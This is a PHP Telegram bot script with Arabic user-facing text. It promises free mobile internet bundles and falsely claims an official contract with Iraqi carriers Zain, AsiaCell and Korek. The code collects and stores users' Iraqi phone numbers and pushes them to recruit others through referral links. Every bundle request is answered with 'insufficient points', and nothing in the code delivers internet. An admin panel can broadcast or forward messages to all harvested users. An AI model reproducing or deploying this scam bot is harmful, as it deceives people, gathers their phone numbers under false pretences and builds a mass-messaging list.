<?php#*wataw*


function step($from_id,$step){
$user = json_decode(file_get_contents("data/users.json"),true);
$user["user"]["$from_id"]["step"]=$step;
$user = json_encode($user,128|256);
file_put_contents("data/users.json",$user);	
return "done!";}
function Forward($KojaShe, $AzKoja, $KodomMSG){
bot('ForwardMessage',[
'chat_id' => $KojaShe,
'from_chat_id' => $AzKoja,
'message_id' => $KodomMSG
]);
}

// $update = json_decode(file_get_contents('php://input')); (Already handled in mak.php)
$message = $update->message;
$chat_id = $message->chat->id;
$message_id = $message->message_id;
$from_id = $message->from->id;
$text = $message->text;
$first_name = $message->from->first_name;
$last_name = $message->from->last_name;
$username = $message->from->username;
$contact = $message->contact;
$contactid = $contact->user_id;
$contactnum = $contact->phone_number;
$user = json_decode(file_get_contents("data/users.json"),true);
$step = $user["user"]["$from_id"]["step"];
$u_num = $user["user"]["$from_id"]["number"];
$zir = $user["user"]["$from_id"]["zir"];
$tc = $update->message->chat->type;
$date = date('Y/m/d');
$time = date('H:i:s');

$admins = array("299938224","$admin");
$tchTag1 = "YYYYi"; //معرف قناتك بدون @

$forchaneel = json_decode(file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=@$tchTag1&user_id=".$chat_id));
$tch = $forchaneel->result->status;

$start_b = json_encode(['keyboard'=>[
[['text'=>"اسبوعية"],['text'=>"شهرية"]],
[['text'=>""],['text'=>"يوميه"]],
[['text'=>"حسابي"],['text'=>"تجميع نقاط"]],],
"resize_keyboard"=>true,]);

$back_b = json_encode(['keyboard'=>[
[['text'=>"Back"]],
],"resize_keyboard"=>true,]);
//┈┈┈┈┈┈┈┈┈┈┈┈┈if┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\\
$members = file_get_contents("data/members.txt");
$memberss = explode("\n",$members);
if(!in_array($from_id,$memberss)){
$myfile2 = fopen("data/members.txt", "a") or die("Unable to open file!");
fwrite($myfile2, "\n$from_id");
fclose($myfile2);
$user["user"]["$from_id"]["step"]="none";
$user["user"]["$from_id"]["zir"]="0";
$user = json_encode($user,128|256);
file_put_contents("data/users.json",$user);}

function Spam($user_id){
@mkdir("data/spam");
$spam_status = json_decode(file_get_contents("data/spam/$user_id.json"),true);
if($spam_status != null){
if(mb_strpos($spam_status[0],"time") !== false){
if(str_replace("time ",null,$spam_status[0]) >= time())
exit(false);
else
$spam_status = [1,time()+2];}
elseif(time() < $spam_status[1]){
if($spam_status[0]+1 > 3){
$time = time() + 200;
$spam_status = ["time $time"];
file_put_contents("data/spam/$user_id.json",json_encode($spam_status,true));
bot('SendMessage',[
'chat_id'=>$user_id,
'text'=>"تم حظرك لمدة 200 ثانية بسبب الرسائل المتكررة!‌‌"]);
exit(false);
}else{
$spam_status = [$spam_status[0]+1,$spam_status[1]];
}}else{
$spam_status = [1,time()+2];
}}else{
$spam_status = [1,time()+2];}
file_put_contents("data/spam/$user_id.json",json_encode($spam_status,true));}
if($tc == "private"){
Spam($from_id);}

if(strpos($text=="/start") !== false&& $text !=="/start" and $tc == "private"){
$id=str_replace("/start ","",$text);
$amar=file_get_contents("data/members.txt");
$exp=explode("\n",$amar);
if(!in_array($from_id,$exp) && $from_id != $id){
$myfile2 = fopen("data/members.txt", "a") or die("Unable to open file!");
fwrite($myfile2, "\n$from_id");
fclose($myfile2);
step($from_id,"none");
$i_zir = $user["user"]["$id"]["zir"];
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
- مرحبًا بك في بوت تنزيل الإنترنت المجاني!
- وفقا للعقد المتفق مع الشركات.
- يمكنك أعزائي الحصول على الباقة الخاصة بك مجانا!
 اضغط : /start .
_",
'parse_mode'=>"MarkDown",]);

if($i_zir < 9 ){
$i_zir = $user["user"]["$id"]["zir"];
$cmmo = $i_zir + 1;
$user["user"]["$id"]["zir"]="$cmmo";
$user = json_encode($user,128|256);
file_put_contents("data/users.json",$user);	
bot('sendMessage',[
'chat_id'=>$id,
'text'=>"✅ انضم شخص ما إلى البوت برابطك الخاص!‌‌",
'parse_mode'=>"MarkDown",
]);
}
}
}

if(!$contact && $u_num == null){
step($from_id,"contact");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
أهلا بك عزيزي المستخدم!
- بوت بوت اسياسيل للإنترنت المجاني.
- لإرسال الإنترنت مباشرة عن طريق البوت وبشكل تلقائي بالكامل ،
- يجب عليك أولاً الضغط فوق رقمك عبر الزر أدناه!
- استخدم رقمك لإرسال الإنترنت ولا يمكن تغييره!
- أرسل رقمك الآن باستخدام الزر أدناه:‌‌
_",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"أرسال رقمي.",'request_contact' => true]]],
"resize_keyboard"=>true,
])
]);
}else{

if($contact && $step == "contact"){
if($contactid == $from_id){
$contactnum1 = str_replace("+","",$contactnum);
if(strstr($contactnum1,"964") == true){
$user["user"]["$from_id"]["step"]="none";
$user["user"]["$from_id"]["number"]="$contactnum";
$user = json_encode($user,128|256);
file_put_contents("data/users.json",$user);	
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"✅ اضغط /start الآن.‌‌",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
'KeyboardRemove'=>[],
'remove_keyboard'=>true,
])
]); 
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"❌ يمكننا فقط تفعيل الإنترنت للأرقام العراقية!
🎙 رقمك ليس عراقي ولا يمكنك استخدام البوت!
💬 الرجاء تسجيل الدخول بالرقم العراقب الذي تريد تفعيل الإنترنت من أجله!
📂 يستخدم هذا الرقم فقط لإرسال وتفعيل الإنترنت تلقائيًا!‌‌",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message_id,
]);
}
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"❌ يمكنك فقط إرسال رقمك باستخدام الزر أدناه!‌‌",
'parse_mode'=>"MarkDown",
'reply_to_message_id'=>$message_id,
]);
}
}

if(preg_match('/^\/([Ss][Tt][Aa][Rr][Tt])/',$text) or $text == "Back"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
مرحبًا بك في بوت تنزيل الإنترنت المجاني!
هذا البوت الذكي يمنحك الإنترنت إلى الرقم الذي سجلته في الخطوة الأولى ، ولكن مع بعض المهام البسيطة! کاملا خدمة مجانية تماماً.

- هذا البوت لديه عقد رسمي مع شركات الاتصالات :
( Zain Iraq ، AsiaCel ، Korek ).

👁️‍🗨️: @$usernamebot
👇🏻 الرجاء تحديد الباقة الخاصة بك‌‌ 👇🏻
_",
'reply_to_message_id'=>$message_id,
'reply_markup'=>$start_b
]);
}

if($text == "حسابي"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
حسابك في البوت:‌‌
📍 عدد الاشخاص الذين دخلو للبوت عن طريق رابطك : $zir
📞 رقمك : $u_num
🔍 آیدك : $chat_id
_____________________
أقل باقة تتطلب 10 نقاط على الأقل.‌‌
_",
'parse_mode'=>"HTML",
'reply_markup' =>$back_b
]);
}

if($text == "تجميع نقاط"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"إنترنت مجاني لجميع المستخدمين.
 أتاح هذا البوت الحصول على باقات إنترنت مجانية.
ما يصل إلى 50 كيكا بايت من الإنترنت المجاني.
يتم تفعيل تلقائيًا بواسطة البوت
قم بتفعيل الباقة مجانًا تمامًا!‌‌

👇🏻 تسجيل الدخول الآن‌‌ 👇🏻
https://telegram.me/$usernamebot?start=$from_id",
]);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
لكل شخص يدخل عن طريق الرابط الخاص بك ، تعتبر نقطة واحدة مجانية!
قم بتفعيل الباقة الخاصة بك على الفور وبشكل تلقائي مجانًا من خلال جمع نقاط بالرابط الخاص بك!
فقط قم باستخدام الاعلان أعلاه ، هذا الاعلان له ارتباط خاص به!
سيتم إرسال لك إشعار بكل شخص قام  بالدخول لك على الفور مع الرابط!
*- يجب أن يصبحوا أعضاء في القناة ويسجلون الخطوات ليتم اعتبارهم نقاط .*
",
'parse_mode'=>"MarkDown",
'reply_markup' =>$back_b
]);
}

if($text == "" or $text == "اسبوعية" or $text == "يوميه" or $text == "شهرية"){
if($text == ""){
$imt_lzm = 10;}

if($text == "يوميه"){
$imt_lzm = 15;}

if($text == "اسبوعية"){
$imt_lzm = 25;}

if($text == "شهرية"){
$imt_lzm = 50;}

$ok = str_replace("تم الاستلام‌‌","",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌ نقاطك غير كافية!
عزيزي المستخدم ؛ تكاليف هذا البوت باهظة الثمن! حزمة $ok ليست كافية لاختيارك!‌‌

لتنزيل هذه الباقة ، يجب دعوة $imt_lzm إلى البوت باستخدام الرابط الخاص بك.‌‌
🆔 : @$usernamebot",
'parse_mode'=>"HTML",
'reply_markup'=>$back_b
]);
}


elseif($text == "" or $text == "" or $text == ""){
step($chat_id,"none");
if(in_array($from_id,$admins)){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"عزيزي المطور هذة لوحة اوامرك",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"اذاعة"],['text'=>"اذاعة توجيه"]],
[['text'=>"أحصائيات"],['text'=>"Back"]],
],"resize_keyboard"=>true])
]); 
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"أنت لست ادمن في البوت",
]); 
}
}

if($text == "أحصائيات"){
if(in_array($from_id,$admins)){
$alluser = file_get_contents("data/members.txt");
$alaki = explode("\n",$alluser);
$allusers = count($alaki)-1;
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"عدد المشتركين البوت : $allusers",
]); 
}
}

if($text == "اذاعة توجيه"){
if(in_array($from_id,$admins)){
step($chat_id,"forall");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"ارسل توجيهك :",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"عودة"]],
],"resize_keyboard"=>true])
]);
}
}

if($step == "forall" and $text != "عودة"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"تم إرسال رسالتك بنجاح",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"عودة"]],
],"resize_keyboard"=>true])]); 
$users = file_get_contents("data/members.txt");
$ex = explode("\n",$users);
foreach($ex as $key){
Forward($key, $chat_id,$message_id);
}
}

if($text == "اذاعة"){
if(in_array($from_id,$admins)){
step($chat_id,"sendall");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"ارسل رسالتك :",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"عودة"]],
],"resize_keyboard"=>true])
]);}}

if($step == "sendall" and $text != "عودة"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"تم إرسال رسالتك بنجاح",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"عودة"]],
],"resize_keyboard"=>true])
]); 
$users = file_get_contents("data/members.txt");
$ex = explode("\n",$users);
foreach($ex as $key){
bot('sendMessage',[
'chat_id'=>$key,
'text'=>$text,
]);
}
}
}
unlink('error_log');

